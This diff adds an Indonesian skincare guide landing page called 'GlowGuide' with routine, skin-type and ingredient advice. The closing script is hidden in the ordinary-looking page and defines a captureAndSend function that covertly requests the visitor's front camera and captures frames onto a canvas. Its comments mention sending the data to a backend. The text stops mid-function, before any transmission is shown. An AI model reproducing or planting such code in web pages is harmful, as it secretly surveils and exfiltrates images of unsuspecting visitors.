@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GlowGuide - Skincare 101</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* Tailwind CSS v3.3.3 default configuration as a base */
+    /* You can extend this with your custom CSS if needed */
+    :root {
+      --rose-50: #fff1f2;
+      --rose-200: #fecdd3;
+      --rose-600: #e11d48;
+      --rose-700: #be123c;
+      --amber-50: #fffdfb;
+      --amber-100: #fef3c7;
+      --amber-200: #fde68a;
+      --amber-600: #d97706;
+      --zinc-800: #27272a;
+      --zinc-900: #181818; /* Adjusted from 1b to be slightly lighter based on common dark themes */
+      --zinc-200: #e4e4e7;
+      --zinc-300: #d4d4d8;
+      --zinc-600: #52525b;
+      --zinc-700: #3f3f46;
+      --zinc-500: #71717a;
+    }
+
+    /* Custom CSS to match the provided styles if needed */
+    .bg-gradient-to-b-rose-white-amber {
+      background-image: linear-gradient(to bottom, var(--rose-50), white, var(--amber-50));
+    }
+    .text-zinc-800 { color: var(--zinc-800); }
+    .sticky { position: sticky; }
+    .top-0 { top: 0; }
+    .z-40 { z-index: 40; }
+    .backdrop-blur { backdrop-filter: blur(12px); }
+    .supports-\[backdrop-filter\]\:bg-white\/70 {
+      @supports (backdrop-filter: blur(12px)) {
+        background-color: rgba(255, 255, 255, 0.7);
+      }
+    }
+    .bg-white\/60 { background-color: rgba(255, 255, 255, 0.6); }
+    .border-b { border-bottom-width: 1px; }
+    .border-zinc-200 { border-color: var(--zinc-200); }
+    .mx-auto { margin-left: auto; margin-right: auto; }
+    .max-w-7xl { max-width: 80rem; } /* Approx 1280px */
+    .px-4 { padding-left: 1rem; padding-right: 1rem; }
+    .sm\:px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
+    .lg\:px-8 { padding-left: 2rem; padding-right: 2rem; }
+    .py-3 { padding-top: 0.75rem; padding-bottom: 0.75rem; }
+    .flex { display: flex; }
+    .items-center { align-items: center; }
+    .justify-between { justify-content: space-between; }
+    .font-extrabold { font-weight: 800; }
+    .tracking-tight { letter-spacing: -0.025em; }
+    .text-xl { font-size: 1.25rem; line-height: 1.75rem; }
+    .sm\:text-2xl { font-size: 1.5rem; line-height: 2rem; }
+    .bg-clip-text { background-clip: text; }
+    .text-transparent { color: transparent; }
+    .bg-gradient-to-r-rose-amber { background-image: linear-gradient(to right, #e11d48, #d97706); } /* Simplified from original */
+    .hidden { display: none; }
+    .md\:flex { display: flex; } /* Only apply on medium screens and up */
+    .gap-6 { gap: 1.5rem; }
+    .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
+    .font-medium { font-weight: 500; }
+    .text-zinc-700 { color: var(--zinc-700); }
+    .hover\:text-rose-600:hover { color: var(--rose-600); }
+    .md\:inline-flex { display: inline-flex; }
+    .gap-2 { gap: 0.5rem; }
+    .rounded-xl { border-radius: 0.75rem; }
+    .px-4 { padding-left: 1rem; padding-right: 1rem; }
+    .py-2 { padding-top: 0.5rem; padding-bottom: 0.5rem; }
+    .bg-zinc-900 { background-color: var(--zinc-900); }
+    .text-white { color: white; }
+    .font-semibold { font-weight: 600; }
+    .shadow-sm { box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); }
+    .hover\:shadow:hover { box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); }
+    .md\:active\:scale-\[.99\]:active { transform: scale(0.99); }
+    .transition { transition-property: all; transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1); transition-duration: 150ms; }
+    .relative { position: relative; }
+    .overflow-hidden { overflow: hidden; }
+    .absolute { position: absolute; }
+    .-top-32 { top: -8rem; }
+    .-left-20 { left: -5rem; }
+    .h-72 { height: 18rem; }
+    .w-72 { width: 18rem; }
+    .rounded-full { border-radius: 9999px; }
+    .bg-rose-200\/60 { background-color: rgba(254, 205, 211, 0.6); }
+    .blur-3xl { filter: blur(40px); }
+    .-bottom-24 { bottom: -6rem; }
+    .-right-20 { right: -5rem; }
+    .bg-amber-200\/60 { background-color: rgba(253, 230, 138, 0.6); }
+    .py-16 { padding-top: 4rem; padding-bottom: 4rem; }
+    .sm\:py-24 { padding-top: 6rem; padding-bottom: 6rem; }
+    .grid { display: grid; }
+    .md\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+    .gap-10 { gap: 2.5rem; }
+    .mt-4 { margin-top: 1rem; }
+    .leading-tight { line-height: 1.25; }
+    .block { display: block; }
+    .text-base { font-size: 1rem; line-height: 1.5rem; }
+    .sm\:text-lg { font-size: 1.125rem; line-height: 1.75rem; }
+    .text-zinc-600 { color: var(--zinc-600); }
+    .flex-col { flex-direction: column; }
+    .sm\:flex-row { flex-direction: row; }
+    .gap-3 { gap: 0.75rem; }
+    .justify-center { justify-content: center; }
+    .rounded-lg { border-radius: 0.5rem; }
+    .bg-rose-600 { background-color: var(--rose-600); }
+    .hover\:shadow-md:hover { box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); }
+    .text-xs { font-size: 0.75rem; line-height: 1rem; }
+    .text-zinc-500 { color: var(--zinc-500); }
+    .border { border-width: 1px; }
+    .border-zinc-300 { border-color: var(--zinc-300); }
+    .bg-white { background-color: white; }
+    .hover\:border-zinc-400:hover { border-color: #a1a1aa; }
+    .relative.md\:h-\[420px\] { position: relative; height: 420px; }
+    .inset-0 { inset: 0; }
+    .-rotate-2 { transform: rotate(-2deg); }
+    .rounded-3xl { border-radius: 1.5rem; }
+    .bg-gradient-to-br-white-rose { background-image: linear-gradient(to bottom right, white, var(--rose-50)); }
+    .bg-white\/80 { background-color: rgba(255, 255, 255, 0.8); }
+    .p-6 { padding: 1.5rem; }
+    .shadow-xl { box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); }
+    .grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+    .p-4 { padding: 1rem; }
+    .hover\:shadow-sm:hover { box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); }
+    .bg-amber-50\/40 { background-color: rgba(255, 253, 251, 0.4); }
+    .lg\:col-span-2 { grid-column: span 2 / span 2; }
+    .py-14 { padding-top: 3.5rem; padding-bottom: 3.5rem; }
+    .shadow-sm { box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); }
+    .lg\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+    .border-rose-200 { border-color: var(--rose-200); }
+    .bg-rose-50 { background-color: var(--rose-50); }
+    .text-rose-700 { color: var(--rose-700); }
+    .text-rose-800\/80 { color: rgba(190, 18, 60, 0.8); }
+    .sm\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+    .h-5 { height: 1.25rem; }
+    .w-5 { width: 1.25rem; }
+    .items-center { align-items: center; }
+    .justify-center { justify-content: center; }
+    .rounded-full { border-radius: 9999px; }
+    .text-\[11px\] { font-size: 11px; }
+    .font-bold { font-weight: 700; }
+    .sm\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+    .lg\:grid-cols-5 { grid-template-columns: repeat(5, minmax(0, 1fr)); }
+    .text-\[10px\] { font-size: 10px; }
+    .rounded-full { border-radius: 9999px; }
+    .bg-amber-100 { background-color: var(--amber-100); }
+    .border-amber-200 { border-color: var(--amber-200); }
+    .text-amber-700 { color: #d97706; }
+    .md\:grid-cols-5 { grid-template-columns: repeat(5, minmax(0, 1fr)); }
+    .h-6 { height: 1.5rem; }
+    .w-6 { width: 1.5rem; }
+    .text-\[11px\] { font-size: 11px; }
+    .bg-rose-50\/40 { background-color: rgba(255, 241, 242, 0.4); }
+    .md\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+    .p-5 { padding: 1.25rem; }
+    .border-amber-200 { border-color: var(--amber-200); }
+    .text-zinc-700 { color: var(--zinc-700); }
+    .space-y-3 > * + * { margin-top: 0.75rem; }
+    .group:hover .group-hover\:rotate-45 { transform: rotate(45deg); }
+    .open\:shadow-sm:global([open]) { box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); }
+    .group:open .group-open\:rotate-45 { transform: rotate(45deg); }
+    .list-none { list-style-type: none; }
+    .cursor-pointer { cursor: pointer; }
+    .pb-20 { padding-bottom: 5rem; }
+    .p-6.sm\:p-10 { padding: 2.5rem; }
+    .text-center { text-align: center; }
+    .focus\:border-rose-400:focus { border-color: #f472b6; }
+    .text-\[11px\] { font-size: 11px; }
+    .text-zinc-500 { color: var(--zinc-500); }
+    .border-t { border-top-width: 1px; }
+    .bg-white\/70 { background-color: rgba(255, 255, 255, 0.7); }
+    .py-6 { padding-top: 1.5rem; padding-bottom: 1.5rem; }
+    .flex-col.sm\:flex-row { flex-direction: row; }
+    .items-center { align-items: center; }
+    .justify-between { justify-content: space-between; }
+    .gap-3 { gap: 0.75rem; }
+    .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
+    .text-zinc-600 { color: var(--zinc-600); }
+    .hidden { display: none; }
+    .relative { position: relative; }
+    .hidden { display: none; }
+    .hidden { display: none; }
+    .video-js .vjs-tech { /* Specific styles for video.js if used, but not in this case */ }
+    .video-js .vjs-control-bar { /* Specific styles for video.js */ }
+  </style>
+</head>
+<body class="min-h-screen bg-gradient-to-b-rose-white-amber text-zinc-800">
+
+  <header class="sticky top-0 z-40 backdrop-blur supports-[backdrop-filter]:bg-white/70 bg-white/60 border-b border-zinc-200">
+    <nav class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-3 flex items-center justify-between">
+      <a href="#hero" class="font-extrabold tracking-tight text-xl sm:text-2xl">
+        <span class="bg-clip-text text-transparent bg-gradient-to-r-rose-amber">Glow</span>
+        Guide
+      </a>
+      <ul class="hidden md:flex gap-6 text-sm font-medium text-zinc-700">
+        <li><a class="hover:text-rose-600" href="#pengertian">Pengertian</a></li>
+        <li><a class="hover:text-rose-600" href="#jenis-kulit">Jenis Kulit</a></li>
+        <li><a class="hover:text-rose-600" href="#rutinitas">Rutinitas</a></li>
+        <li><a class="hover:text-rose-600" href="#bahan-aktif">Bahan Aktif</a></li>
+        <li><a class="hover:text-rose-600" href="#faq">FAQ</a></li>
+      </ul>
+      <a href="#cta" class="hidden md:inline-flex items-center gap-2 rounded-xl px-4 py-2 bg-zinc-900 text-white text-sm font-semibold shadow-sm hover:shadow md:active:scale-[.99] transition">
+        Mulai Gratis
+      </a>
+    </nav>
+  </header>
+
+  <section id="hero" class="relative overflow-hidden">
+    <div class="absolute -top-32 -left-20 h-72 w-72 rounded-full bg-rose-200/60 blur-3xl"></div>
+    <div class="absolute -bottom-24 -right-20 h-72 w-72 rounded-full bg-amber-200/60 blur-3xl"></div>
+
+    <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-16 sm:py-24">
+      <div class="grid md:grid-cols-2 items-center gap-10">
+        <div>
+          <p class="inline-flex items-center rounded-full border border-rose-200 bg-white px-3 py-1 text-xs font-medium text-rose-700 shadow-sm">Skincare 101</p>
+          <h1 class="mt-4 text-4xl sm:text-5xl font-extrabold leading-tight tracking-tight">
+            Skincare itu apa sih?
+            <span class="block text-transparent bg-clip-text bg-gradient-to-r-rose-amber">Perawatan kulit, simpel & efektif.</span>
+          </h1>
+          <p class="mt-4 text-base sm:text-lg text-zinc-600">
+            Skincare adalah rangkaian perawatan untuk menjaga kesehatan <em>skin barrier</em>, mengatasi masalah kulit, dan mencegah kerusakan jangka panjang (terutama dari matahari).
+            Kuncinya: konsisten, sesuai jenis kulit, dan tidak berlebihan.
+          </p>
+          <div class="mt-6 flex flex-col sm:flex-row gap-3">
+            <a href="#rutinitas" class="inline-flex justify-center rounded-xl bg-rose-600 px-5 py-3 text-white font-semibold shadow hover:shadow-md active:scale-[.99] transition">Lihat Rutinitas Dasar</a>
+            <a href="#bahan-aktif" class="inline-flex justify-center rounded-xl border border-zinc-300 bg-white px-5 py-3 text-zinc-800 font-semibold hover:border-zinc-400 active:scale-[.99] transition">Pelajari Bahan Aktif</a>
+          </div>
+          <p class="mt-3 text-xs text-zinc-500">Butuh ringkas? Ikuti langkah 3—4—5: cuci muka, lembapkan, sunscreen.</p>
+        </div>
+
+        <div class="relative md:h-[420px]">
+          <div class="absolute inset-0 -rotate-2 rounded-3xl bg-gradient-to-br-white-rose border border-zinc-200 shadow-xl"></div>
+          <div class="relative m-2 rounded-3xl border border-zinc-200 bg-white/80 backdrop-blur p-6 shadow-xl">
+            <div class="grid grid-cols-3 gap-3">
+              <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
+                <p class="text-xs font-semibold text-rose-600">Hydrating</p>
+                <p class="mt-1 text-xs text-zinc-600">Kulit terasa kenyal & lembap.</p>
+              </div>
+              <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
+                <p class="text-xs font-semibold text-rose-600">Brightening</p>
+                <p class="mt-1 text-xs text-zinc-600">Tona lebih merata & cerah.</p>
+              </div>
+              <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
+                <p class="text-xs font-semibold text-rose-600">Soothing</p>
+                <p class="mt-1 text-xs text-zinc-600">Reda kemerahan & iritasi.</p>
+              </div>
+              <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
+                <p class="text-xs font-semibold text-rose-600">Oil-Control</p>
+                <p class="mt-1 text-xs text-zinc-600">Mengurangi kilap berlebih.</p>
+              </div>
+              <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
+                <p class="text-xs font-semibold text-rose-600">Anti-Aging</p>
+                <p class="mt-1 text-xs text-zinc-600">Haluskan garis halus.</p>
+              </div>
+              <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
+                <p class="text-xs font-semibold text-rose-600">Barrier Care</p>
+                <p class="mt-1 text-xs text-zinc-600">Perbaiki lapisan pelindung.</p>
+              </div>
+            </div>
+            <div class="mt-4 rounded-2xl bg-amber-50 border border-amber-200 p-4">
+              <p class="text-sm font-semibold">Golden rule</p>
+              <p class="text-xs text-zinc-600">Sunscreen tiap pagi, reapply 2—3 jam. Ini fondasi anti-aging terbaik.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="pengertian" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
+    <div class="grid lg:grid-cols-3 gap-6">
+      <div class="lg:col-span-2 rounded-3xl border border-zinc-200 bg-white p-6 shadow-sm">
+        <h2 class="text-2xl sm:text-3xl font-bold">Pengertian Skincare</h2>
+        <p class="mt-3 text-zinc-600">
+          Skincare mencakup kebiasaan harian untuk membersihkan, menutrisi, dan melindungi kulit. Tujuannya menjaga <strong>keseimbangan minyak–air</strong>,
+          memperkuat <strong>skin barrier</strong>, dan mencegah kerusakan akibat sinar UV, polusi, serta stres. Rutinitas yang baik tidak harus rumit—yang penting <strong>konsisten</strong> dan <strong>tepat sasaran</strong>.
+        </p>
+        <ul class="mt-4 grid sm:grid-cols-3 gap-3 text-sm">
+          <li class="flex items-center gap-2 rounded-xl border border-zinc-200 bg-rose-50/40 px-3 py-2"><span class="inline-flex h-5 w-5 items-center justify-center rounded-full bg-rose-600 text-white text-[11px] font-bold">1</span>Bersihkan kotoran & sunscreen</li>
+          <li class="flex items-center gap-2 rounded-xl border border-zinc-200 bg-rose-50/40 px-3 py-2"><span class="inline-flex h-5 w-5 items-center justify-center rounded-full bg-rose-600 text-white text-[11px] font-bold">2</span>Hidrasi & kunci kelembapan</li>
+          <li class="flex items-center gap-2 rounded-xl border border-zinc-200 bg-rose-50/40 px-3 py-2"><span class="inline-flex h-5 w-5 items-center justify-center rounded-full bg-rose-600 text-white text-[11px] font-bold">3</span>Lindungi dari sinar UV</li>
+        </ul>
+      </div>
+      <aside class="rounded-3xl border border-rose-200 bg-rose-50 p-6 shadow-sm">
+        <p class="text-sm font-semibold text-rose-700">Catatan singkat</p>
+        <p class="mt-1 text-sm text-rose-800/80">Gunakan produk baru satu per satu (patch test), beri jeda 2–3 minggu untuk melihat hasilnya.</p>
+      </aside>
+    </div>
+  </section>
+
+  <section id="jenis-kulit" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
+    <h2 class="text-2xl sm:text-3xl font-bold">Kenali Jenis Kulit</h2>
+    <p class="mt-2 text-sm text-zinc-600">Pilih produk sesuai kondisi kulit agar hasilnya optimal.</p>
+    <div class="mt-6 grid sm:grid-cols-2 lg:grid-cols-5 gap-4">
+      <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
+        <div class="flex items-center justify-between">
+          <p class="font-semibold">Normal</p>
+        </div>
+        <p class="mt-2 text-xs text-zinc-600">Seimbang. Pakai rutinitas dasar + sunscreen.</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
+        <div class="flex items-center justify-between">
+          <p class="font-semibold">Kering</p>
+        </div>
+        <p class="mt-2 text-xs text-zinc-600">Cari humektan (HA) + emolien (ceramide).</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
+        <div class="flex items-center justify-between">
+          <p class="font-semibold">Berminyak</p>
+          <span class="text-[10px] rounded-full bg-amber-100 px-2 py-1 border border-amber-200 text-amber-700">Sebum</span>
+        </div>
+        <p class="mt-2 text-xs text-zinc-600">Gunakan gel-cream, BHA untuk pori.</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
+        <div class="flex items-center justify-between">
+          <p class="font-semibold">Kombinasi</p>
+        </div>
+        <p class="mt-2 text-xs text-zinc-600">Rawat T-zone berminyak, pipi kering terpisah.</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
+        <div class="flex items-center justify-between">
+          <p class="font-semibold">Sensitif</p>
+        </div>
+        <p class="mt-2 text-xs text-zinc-600">Minim bahan aktif, fokus soothing (centella).</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="rutinitas" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
+    <div class="rounded-3xl border border-zinc-200 bg-white p-6 shadow-sm">
+      <div class="flex items-center justify-between flex-wrap gap-3">
+        <h2 class="text-2xl sm:text-3xl font-bold">Rutinitas Dasar (Pagi & Malam)</h2>
+        <a href="#cta" class="inline-flex items-center rounded-xl border border-zinc-300 bg-white px-4 py-2 text-sm font-semibold hover:border-zinc-400">Unduh Checklist</a>
+      </div>
+      <div class="mt-6 grid md:grid-cols-5 gap-4">
+        <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
+          <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">1</div>
+          <p class="mt-3 font-semibold">Cleanser</p>
+          <p class="text-sm text-zinc-600">Pagi & malam. Pilih gentle.</p>
+        </div>
+        <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
+          <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">2</div>
+          <p class="mt-3 font-semibold">Hydrator/Toner</p>
+          <p class="text-sm text-zinc-600">Pulihkan pH & hidrasi.</p>
+        </div>
+        <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
+          <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">3</div>
+          <p class="mt-3 font-semibold">Serum</p>
+          <p class="text-sm text-zinc-600">Sasaran: jerawat, kusam, aging.</p>
+        </div>
+        <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
+          <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">4</div>
+          <p class="mt-3 font-semibold">Moisturizer</p>
+          <p class="text-sm text-zinc-600">Kunci hidrasi, perbaiki barrier.</p>
+        </div>
+        <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
+          <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">5</div>
+          <p class="mt-3 font-semibold">Sunscreen (AM)</p>
+          <p class="text-sm text-zinc-600">SPF 30+ broad spectrum.</p>
+        </div>
+      </div>
+      <p class="mt-4 text-xs text-zinc-500">Malam hari ganti sunscreen dengan treatment (mis. retinol) sesuai kebutuhan & toleransi.</p>
+    </div>
+  </section>
+
+  <section id="bahan-aktif" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
+    <h2 class="text-2xl sm:text-3xl font-bold">Bahan Aktif Populer</h2>
+    <p class="mt-2 text-sm text-zinc-600">Sesuaikan bahan aktif dengan target masalah kulit.</p>
+    <div class="mt-6 grid md:grid-cols-3 gap-4">
+      <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
+        <p class="text-sm font-semibold">Niacinamide</p>
+        <p class="mt-1 text-sm text-zinc-600">Cara kerja: Meratakan warna kulit, atur sebum, menenangkan.</p>
+        <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Hampir semua jenis kulit.</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
+        <p class="text-sm font-semibold">Salicylic Acid (BHA)</p>
+        <p class="mt-1 text-sm text-zinc-600">Cara kerja: Eksfoliasi dalam pori, kurangi komedo.</p>
+        <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Kulit berminyak/berjerawat.</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
+        <p class="text-sm font-semibold">Hyaluronic Acid</p>
+        <p class="mt-1 text-sm text-zinc-600">Cara kerja: Tarik & tahan air di kulit.</p>
+        <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Kulit kering atau dehidrasi.</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
+        <p class="text-sm font-semibold">Retinol</p>
+        <p class="mt-1 text-sm text-zinc-600">Cara kerja: Stimulasi kolagen, haluskan tekstur & garis.</p>
+        <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Anti-aging, malam hari, bertahap.</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
+        <p class="text-sm font-semibold">Vitamin C</p>
+        <p class="mt-1 text-sm text-zinc-600">Cara kerja: Antioksidan, cerahkan & lindungi dari radikal bebas.</p>
+        <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Pagi hari, SPF wajib.</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
+        <p class="text-sm font-semibold">Ceramide</p>
+        <p class="mt-1 text-sm text-zinc-600">Cara kerja: Perkuat barrier, kurangi TEWL.</p>
+        <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Kulit kering/sensitif.</p>
+      </div>
+    </div>
+    <div class="mt-4 rounded-2xl border border-amber-200 bg-amber-50 p-4 text-sm">
+      <p class="font-semibold">Tips kombinasi aman</p>
+      <p class="text-zinc-700">Hindari menumpuk terlalu banyak aktif sekaligus. Contoh: kenalkan retinol bertahap; jangan langsung dipasangkan dengan AHA/BHA tiap malam.</p>
+    </div>
+  </section>
+
+  <section class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
+    <h2 class="text-2xl sm:text-3xl font-bold">Mitos vs Fakta</h2>
+    <div class="mt-6 grid md:grid-cols-2 gap-4">
+      <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
+        <p class="text-xs font-semibold text-rose-600">Mitos</p>
+        <p class="text-sm">Kulit berminyak tidak butuh moisturizer</p>
+        <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
+        <p class="text-sm text-zinc-700">Tetap butuh! Pilih gel-cream ringan agar barrier terjaga.</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
+        <p class="text-xs font-semibold text-rose-600">Mitos</p>
+        <p class="text-sm">Semakin tinggi SPF, tak perlu reapply</p>
+        <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
+        <p class="text-sm text-zinc-700">Reapply tetap penting tiap 2–3 jam saat siang/terpapar matahari.</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
+        <p class="text-xs font-semibold text-rose-600">Mitos</p>
+        <p class="text-sm">Retinol bikin kulit tipis</p>
+        <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
+        <p class="text-sm text-zinc-700">Pemakaian benar justru menebalkan dermis & tingkatkan kolagen.</p>
+      </div>
+      <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
+        <p class="text-xs font-semibold text-rose-600">Mitos</p>
+        <p class="text-sm">Produk mahal pasti lebih bagus</p>
+        <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
+        <p class="text-sm text-zinc-700">Yang penting formulasi tepat & cocok untuk kulitmu.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="faq" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
+    <h2 class="text-2xl sm:text-3xl font-bold">Pertanyaan yang Sering Ditanya</h2>
+    <div class="mt-6 space-y-3">
+      <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
+        <summary class="cursor-pointer list-none font-semibold">
+          <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
+          Urutan skincare yang benar?
+        </summary>
+        <p class="mt-2 text-sm text-zinc-600">Pagi: Cleanser—Hydrator—Serum—Moisturizer—Sunscreen. Malam: Cleanser—Hydrator—Treatment—Moisturizer.</p>
+      </details>
+      <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
+        <summary class="cursor-pointer list-none font-semibold">
+          <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
+          Berapa banyak sunscreen?
+        </summary>
+        <p class="mt-2 text-sm text-zinc-600">Sekitar dua jari untuk wajah & leher. Reapply tiap 2–3 jam.</p>
+      </details>
+      <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
+        <summary class="cursor-pointer list-none font-semibold">
+          <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
+          Kapan lihat hasil?
+        </summary>
+        <p class="mt-2 text-sm text-zinc-600">Umumnya 4–8 minggu konsisten, tergantung masalah dan produk.</p>
+      </details>
+      <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
+        <summary class="cursor-pointer list-none font-semibold">
+          <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
+          Boleh campur banyak aktif?
+        </summary>
+        <p class="mt-2 text-sm text-zinc-600">Mulai satu per satu, dengarkan kulit. Prioritaskan barrier & SPF.</p>
+      </details>
+    </div>
+  </section>
+
+  <section id="cta" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 pb-20">
+    <div class="rounded-3xl border border-zinc-200 bg-gradient-to-br from-rose-100 to-amber-100 p-6 sm:p-10 text-center shadow-sm">
+      <h3 class="text-2xl sm:text-3xl font-bold">Siap kulit sehat & glowing?</h3>
+      <p class="mt-2 text-sm text-zinc-700">Dapatkan checklist PDF & rekomendasi rutin sesuai jenis kulitmu.</p>
+      <form onsubmit="event.preventDefault();" class="mt-6 mx-auto max-w-md flex gap-3">
+        <input type="email" required placeholder="Email kamu" class="flex-1 rounded-xl border border-zinc-300 bg-white px-4 py-3 text-sm outline-none focus:border-rose-400" />
+        <button class="rounded-xl bg-zinc-900 px-5 py-3 text-white text-sm font-semibold hover:shadow active:scale-[.99]">Dapatkan</button>
+      </form>
+      <p class="mt-2 text-[11px] text-zinc-500">Dengan menekan “Dapatkan”, kamu setuju dengan kebijakan privasi kami.</p>
+    </div>
+  </section>
+
+  <footer class="border-t border-zinc-200 bg-white/70">
+    <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-6 flex flex-col sm:flex-row items-center justify-between gap-3 text-sm text-zinc-600">
+      <p>© 2024 GlowGuide. All rights reserved.</p>
+      <div class="flex gap-4">
+        <a href="#" class="hover:text-rose-600">Kebijakan Privasi</a>
+        <a href="#" class="hover:text-rose-600">Ketentuan Layanan</a>
+        <a href="#hero" class="hover:text-rose-600">Kembali ke atas</a>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // JavaScript asli disematkan di sini
+    // Perhatikan bahwa fungsionalitas navigator.mediaDevices.getUserMedia mungkin tidak berfungsi
+    // atau memerlukan izin browser, dan pengiriman data mungkin memerlukan server backend.
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const videoElement = document.getElementById('videoElement');
+      const canvasElement = document.getElementById('canvasElement');
+      let streamRef = null;
+
+      async function captureAndSend() {
+        // Cek apakah elemen video dan canvas ada
+        if (!videoElement || !canvasElement) {
+          console.warn("Video or canvas elements not found. Skipping captureAndSend.");
+          return;
+        }
+
+        try {
+          // Meminta akses kamera (mungkin memerlukan izin browser)
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+          streamRef = stream;
+          
+          videoElement.srcObject = stream;
+          await videoElement.play();
+
+          const canvas = canvasElement;
+          // Mendapatkan dimensi video yang sebenarnya
+          const w = videoElement.videoWidth || 720;
+          const h = videoElement.videoHeight || 720;
+          canvas.width = w;
+          canvas.height = h;
